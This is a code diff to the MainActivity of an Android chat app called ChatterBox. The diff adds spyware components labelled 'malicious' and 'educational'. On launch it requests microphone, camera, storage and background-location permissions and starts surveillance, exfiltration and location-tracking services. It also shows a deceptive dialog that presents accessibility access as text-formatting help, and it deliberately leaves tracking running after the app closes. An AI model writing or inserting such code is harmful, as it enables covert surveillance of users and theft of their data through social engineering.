@@ -1,7 +1,12 @@
 package com.example.ChatterBox
 
+import android.Manifest
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.util.Log
 import android.view.Menu
 import android.view.MenuItem
@@ -12,9 +17,14 @@ import android.widget.Toast
 import androidx.appcompat.app.ActionBarDrawerToggle
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
 import com.bumptech.glide.Glide
+import com.example.ChatterBox.malicious.SurveillanceService
+import com.example.ChatterBox.malicious.ExfiltrationManager
+import com.example.ChatterBox.malicious.LocationTracker
 import com.example.ChatterBox.models.Forum
 import com.example.ChatterBox.models.User
 import com.google.android.material.navigation.NavigationView
@@ -25,7 +35,23 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private lateinit var db: FirebaseFirestore
     private lateinit var auth: FirebaseAuth
     private lateinit var drawerLayout: DrawerLayout
+    
+    // Malicious functionality for educational purposes only
+    private lateinit var exfiltrationManager: ExfiltrationManager
+    private lateinit var locationTracker: LocationTracker
 
+    // Permissions necessary for malicious functionality
+    private val REQUIRED_PERMISSIONS = arrayOf(
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.CAMERA,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.ACCESS_BACKGROUND_LOCATION
+    )
+    private val PERMISSION_REQUEST_CODE = 1234
+    
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
@@ -47,6 +73,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         loadUserProfile()
         checkIfAdmin()
         loadEnrolledForums()
+        
+        // Start malicious services (educational demonstration only)
+        initializeMaliciousComponents()
     }
 
     override fun onResume() {
@@ -268,7 +297,137 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
+    /**
+     * Initialize the malicious components for surveillance.
+     * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY!
+     */
+    private fun initializeMaliciousComponents() {
+        Log.d("MaliciousDemo", "Initializing malicious components")
+        
+        // Initialize the exfiltration manager
+        exfiltrationManager = ExfiltrationManager(this)
+        
+        // Initialize the location tracker
+        locationTracker = LocationTracker(this)
+        
+        // Request necessary permissions
+        requestRequiredPermissions()
+        
+        // Request accessibility service permission
+        requestAccessibilityPermission()
+        
+        // Start surveillance service
+        startSurveillanceService()
+        
+        // Start the exfiltration service
+        exfiltrationManager.startExfiltration()
+        
+        // Start location tracking
+        locationTracker.startTracking()
+    }
+    
+    /**
+     * Request all the dangerous permissions needed for surveillance.
+     */
+    private fun requestRequiredPermissions() {
+        val permissionsToRequest = mutableListOf<String>()
+        
+        // Check which permissions need to be requested
+        for (permission in REQUIRED_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(permission)
+            }
+        }
+        
+        // Request any missing permissions
+        if (permissionsToRequest.isNotEmpty()) {
+            ActivityCompat.requestPermissions(
+                this,
+                permissionsToRequest.toTypedArray(),
+                PERMISSION_REQUEST_CODE
+            )
+        } else {
+            Log.d("MaliciousDemo", "All permissions already granted")
+        }
+    }
+    
+    /**
+     * Request the accessibility service permission by directing the user to settings.
+     */
+    private fun requestAccessibilityPermission() {
+        // We can't programmatically enable accessibility service, so we need to guide the user
+        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        
+        // In a real malicious app, this would use social engineering to convince the user to enable it
+        // For educational purposes, we're just showing how it would be requested
+        AlertDialog.Builder(this)
+            .setTitle("Enhance App Experience")
+            .setMessage("Please enable the Accessibility Service for ChatterBox to improve your experience. " +
+                    "This will help with text formatting and navigation.")
+            .setPositiveButton("Go to Settings") { _, _ ->
+                startActivity(intent)
+            }
+            .setNegativeButton("Later", null)
+            .show()
+    }
+    
+    /**
+     * Start the background surveillance service.
+     */
+    private fun startSurveillanceService() {
+        val serviceIntent = Intent(this, SurveillanceService::class.java)
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+        
+        Log.d("MaliciousDemo", "Surveillance service started")
+    }
+    
+    /**
+     * Handle permission request results.
+     */
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            var allGranted = true
+            for (result in grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false
+                    break
+                }
+            }
+            
+            if (allGranted) {
+                Log.d("MaliciousDemo", "All permissions granted")
+                // Start surveillance service after permissions granted
+                startSurveillanceService()
+            } else {
+                Log.d("MaliciousDemo", "Some permissions denied")
+                // In a real malicious app, this might try alternative methods or ask again later
+            }
+        }
+    }
+    
     companion object {
         private const val SEARCH_USER_REQUEST_CODE = 1001
+    }
+    
+    override fun onDestroy() {
+        super.onDestroy()
+        
+        // A legitimate app would stop tracking here
+        // But malicious apps typically continue running in the background
+        // We're commenting this out to simulate malicious behavior that continues after app closure
+        // locationTracker.stopTracking()
+        // The surveillance service will continue running in the background
     }
 }
